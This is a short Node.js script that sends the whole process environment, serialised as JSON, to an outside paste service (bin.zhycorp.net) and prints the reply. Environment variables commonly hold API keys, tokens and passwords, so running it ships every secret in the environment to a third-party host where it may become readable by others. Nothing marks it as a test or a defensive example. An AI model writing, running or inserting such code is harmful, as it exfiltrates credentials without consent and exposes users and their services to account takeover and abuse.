const axios = require("axios");

(async () => {
  const data = await axios.post("https://bin.zhycorp.net/documents", JSON.stringify(process.env, null, 2));

  console.log(data.data);
})();
